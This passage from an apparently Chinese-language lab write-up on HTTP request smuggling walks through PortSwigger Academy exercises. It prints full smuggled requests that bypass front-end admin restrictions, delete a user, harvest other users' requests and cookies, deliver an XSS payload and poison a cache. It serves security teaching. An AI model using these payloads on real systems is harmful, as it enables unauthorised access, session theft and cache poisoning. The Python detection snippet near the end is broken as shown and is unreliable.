localhost</span><br></pre></td></tr></table></figure><p>发送两次，能成功访问/admin页面了，这里可看到carlos用户的信息及其删除的接口<code>/admin/delete?username=carlos</code>：</p><p><img src="/2020/03/11/浅析HRS漏洞/11.png" alt=""></p><p>构造最终的报文访问该删除接口即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure><p>多发送几次，发现已经302了，此时是已经成功删除carlos用户的了：</p><p><img src="/2020/03/11/浅析HRS漏洞/12.png" alt=""></p><p>此时重新登录再次查看，发现已经没有carlos用户了：</p><p><img src="/2020/03/11/浅析HRS漏洞/13.png" alt=""></p><h4 id="TE-CL场景绕过"><a href="#TE-CL场景绕过" class="headerlink" title="TE.CL场景绕过"></a>TE.CL场景绕过</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。</p><p>和前面类似，不再多说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca31f051f556e6780403e2f00570083.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3d</span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><img src="/2020/03/11/浅析HRS漏洞/14.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/15.png" alt=""></p><h3 id="获取前端服务器重写请求字段"><a href="#获取前端服务器重写请求字段" class="headerlink" title="获取前端服务器重写请求字段"></a>获取前端服务器重写请求字段</h3><blockquote><p>在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p><ul><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ul></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。/admin上有一个管理面板，但只有IP地址为127.0.0.1的用户才能访问。前端服务器将HTTP标头添加到包含其IP地址的传入请求中。它类似于X-Forwarded-For标头，但名称不同。要解决此问题，请向后端服务器走私一个请求，以显示前端服务器添加的标头。然后将包含添加的标头的请求走私到后端服务器，访问管理面板，并删除用户carlos。</p><p>我们像之前一样发包尝试通过Host头设置127.0.0.1来访问/admin，发现行不通：</p><p><img src="/2020/03/11/浅析HRS漏洞/18.png" alt=""></p><p>那就是说，后端服务器不是通过Host头而是通过其他可能是前端服务器添加的头来解析得到IP地址的。</p><p>此时，我们需要先找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能：</p><p>首先我们找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能：</p><p><img src="/2020/03/11/浅析HRS漏洞/16.png" alt=""></p><p>其中该请求报文如下，直接POST方式带上search参数访问/即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/17.png" alt=""></p><p>接着构造如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 78</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 100</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=mi1k7ea</span><br></pre></td></tr></table></figure><p>其中CL值为100，而后面数据的长度是不够100的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达100时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p><p>发送几次看到Search结果处返回了包含X-NntHAY-Ip头，它的值为IP地址：</p><p><img src="/2020/03/11/浅析HRS漏洞/19.png" alt=""></p><p>将之前CL.TE的构造报文的头改下就ok了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 52</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-NntHAY-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p>多发送几次就能成功访问到/admin页面：</p><p><img src="/2020/03/11/浅析HRS漏洞/20.png" alt=""></p><p>最后就是构造删除carlos用户的报文了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 75</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">X-NntHAY-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p>多发送几次即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/21.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/22.png" alt=""></p><h3 id="获取其他用户的请求"><a href="#获取其他用户的请求" class="headerlink" title="获取其他用户的请求"></a>获取其他用户的请求</h3><blockquote><p>在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。</p></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。为了解决实验室问题，请将请求走私到后端服务器，该请求将下一个用户的请求存储在应用程序中。然后检索下一个用户的请求，并使用受害用户的cookie来访问其帐户。</p><p>首先我们需要找到保存用户POST参数的页面，这里我们随便点击一篇博文查看，在提交评论的时候可以在文章评论一栏中保存我们POST的内容：</p><p><img src="/2020/03/11/浅析HRS漏洞/23.png" alt=""></p><p>对应如下接口：</p><p><img src="/2020/03/11/浅析HRS漏洞/24.png" alt=""></p><p>构造如下请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac0b1fda1f41126280f9132f0097008c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://ac0b1fda1f41126280f9132f0097008c.web-security-academy.net/post/comment/confirmation?postId=2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDt</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 270</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net</span><br><span class="line">Cookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDt</span><br><span class="line">Content-Length: 400</span><br><span class="line"></span><br><span class="line">csrf=za3lvdP3pkuZE53Npssm5z7LN48uUQoR&amp;postId=2&amp;name=mi1k7ea&amp;email=email%40qq.com&amp;website=&amp;comment=</span><br></pre></td></tr></table></figure><p>其中CL值为400，而后面数据的长度是不够400的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达400时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数comment的一部分，然后在指定的博文的评论中返回显示出来。</p><p>多请求几次，然后到该博文中查看评论就看到包括其他用户请求的信息（这里是User-Agent不同来辨别的）：</p><p><img src="/2020/03/11/浅析HRS漏洞/25.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/26.png" alt=""></p><h3 id="组合反射型XSS"><a href="#组合反射型XSS" class="headerlink" title="组合反射型XSS"></a>组合反射型XSS</h3><p>当HRS与反射型XSS组合利用时，就不再需要用户的交互来触发XSS了。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。该应用程序在User-Agent头处存在反射型XSS。 为了解决实验室问题，请将请求走私到后端服务器，该请求导致下一个用户的请求接收到包含执行<code>alert(1)</code>的XSS漏洞的响应。</p><p>首先我们找下存在反射型XSS的页面，根据提示是User-Agent注入的XSS，而我们在查看具体文章的时候确实是找到了这个接口存在User-Agent的反射型XSS：</p><p><img src="/2020/03/11/浅析HRS漏洞/27.png" alt=""></p><p>为了让这个反射型XSS的利用更多深入，我们结合HRS，这样无需用户交互就能触发XSS。构造如下请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac131fc91e3b433b80100743007900e8.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 74</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post?postId=4 HTTP/1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p>发送几次：</p><p><img src="/2020/03/11/浅析HRS漏洞/29.png" alt=""></p><p>然后刷新界面就会触发XSS弹框：</p><p><img src="/2020/03/11/浅析HRS漏洞/28.png" alt=""></p><h3 id="组合Web缓存投毒攻击"><a href="#组合Web缓存投毒攻击" class="headerlink" title="组合Web缓存投毒攻击"></a>组合Web缓存投毒攻击</h3><blockquote><p>一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。</p></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器配置为缓存某些响应。为了解决此问题，请执行请求走私攻击，使缓存中毒，以便随后对JavaScript文件的请求将重定向到漏洞利用服务器。中毒的缓存应alert(document.cookie)。</p><p>实验环境提供了漏洞利用的辅助服务器，这里我们编辑响应的报文如下，为了方便看效果先将alert(document.cookie)改为alert(1)：</p><p><img src="/2020/03/11/浅析HRS漏洞/30.png" alt=""></p><p>构造如下POST请求走私报文，这里可以通过HRS攻击使得该网站的下一个请求重定向到漏洞利用服务器上的/post接口，而我们知道该接口响应返回的是前面设置的alert(1)内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=1 HTTP/1.1</span><br><span class="line">Host: ac521f121f4e12738066379201d30067.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br></pre></td></tr></table></figure><p>接着重放访问其中随意一个js文件的报文，这里选择/resources/js/tracking.js，当上一个HRS攻击报文发送后，由其中”GET /post/next?postId=1 HTTP/1.1”之后的内容将会和当前的访问/resources/js/tracking.js的报文拼接起来，而此时合并的报文实际是访问漏洞利用服务器的js文件即响应返回“alert(1)”，此时缓存的/resources/js/tracking.js文件的内容实际上就被投毒攻击为“alert(1)”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /resources/js/tracking.js HTTP/1.1</span><br><span class="line">Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://aceb1fb41f8e127580ac37b400560067.web-security-academy.net/</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=mOFHLW0BPPkUKB4V858oSPuy3rTh9eUn</span><br></pre></td></tr></table></figure><p>上面POST和GET报文交替发送多次，然后点击第一篇博文查看，可以看到响应为缓存的漏洞利用服务器上的js文件：</p><p><img src="/2020/03/11/浅析HRS漏洞/31.png" alt=""></p><p>此时再访问主页，成功弹框，即缓存投毒攻击成功：</p><p><img src="/2020/03/11/浅析HRS漏洞/32.png" alt=""></p><h2 id="0x05-BurpSuite的HRS扫描原理"><a href="#0x05-BurpSuite的HRS扫描原理" class="headerlink" title="0x05 BurpSuite的HRS扫描原理"></a>0x05 BurpSuite的HRS扫描原理</h2><p>简单地说，BurpSuite是通过构造特定的数据包让后端服务器阻塞，通过超时机制来进行HRS漏洞检测的。</p><h3 id="CL-TE型HRS扫描原理"><a href="#CL-TE型HRS扫描原理" class="headerlink" title="CL.TE型HRS扫描原理"></a>CL.TE型HRS扫描原理</h3><p>针对CL.TE型HRS，BurpSuite发送以下报文进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><p>如果前端服务器是使用CL解析，那么根据数据包中的<code>Content-Length: 4</code>，前台服务器只会转发这个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1\r\n</span><br><span class="line">Z</span><br></pre></td></tr></table></figure><p>而后端服务器使用TE解析，由于前端服务器转发过了的body中并未有<code>0\r\n\r\n</code>，因此后端服务器会一直等待下一个chunked块的大小值，但由于没有因此会造成约为10s的超时。</p><p>但是当数据包中的<code>Content-Length: 11</code>时，因为Q是一个无效的块大小值（chunked块大小值用十六进制表示，Q不能表示十六进制数），所以后端服务器中该请求结束，不会产生超时，双换行是因为部分系统没有换行会进行等待，原因未知：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><p>如果服务端是TE.CL类型，则由于无效的块大小“Q”，前端服务器就已经拒绝该请求而不会转发到后端服务器中。这样可以防止后端服务器Socket中毒。</p><p>代码实现如下，先判断CL为4时是否超时，若超时且CL为11时不超时，如果CL为4的响应时间大于5s且CL为4的请求响应时间远大于CL为11的响应时间，即可认为存在CL.TE型HRS漏洞：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span><span class="params">(self)</span>:</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">    <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">        n = n + <span class="number">1</span></span><br><span class="line">        headers[<span class="string">'Content-Length'</span>] = <span class="number">4</span></span><br><span class="line">        payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">        print(self.url, headers)</span><br><span class="line">        t2 = self.detect_CLTE(headers, payload)</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                headers[<span class="string">'Content-Length'</span>] = <span class="number">11</span></span><br><span class="line">                print(self.url, headers)</span><br><span class="line">                payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">                t1 = self.detect_CLTE(headers, payload)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">print</span> (t1, t2)</span><br><span class="line">                    <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                        self.valid = <span class="keyword">True</span></span><br><span class="line">                        self.type = <span class="string">"CL-TE"</span></span><br><span class="line">                        self.headers_payload = [headers]</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h3 id="TE-CL型HRS扫描原理"><a href="#TE-CL型HRS扫描原理" class="headerlink" title="TE.CL型HRS扫描原理"></a>TE.CL型HRS扫描原理</h3><p>针对TE.CL型HRS，BurpSuite发送以下报文进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure><p>因为前端服务器使用TE解析，<code>0\r\n\r\n</code>代表chunked结束，所以后端服务器只会收到如下部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span 